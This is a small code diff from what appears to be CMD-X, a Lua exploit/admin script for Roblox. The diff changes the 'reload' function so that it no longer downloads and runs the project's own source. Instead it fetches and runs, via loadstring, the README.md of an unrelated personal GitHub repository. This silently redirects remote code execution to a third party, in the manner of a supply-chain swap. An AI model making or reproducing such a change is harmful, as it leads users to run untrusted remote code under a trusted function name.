@@ -7857,7 +7857,7 @@ end
 
 function useCommand.reload()
 	opx("-","Reloading CMD-X...")
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/russbzallin/russbzallin/main/README.md", true))()
 end
 
 function useCommand.console()
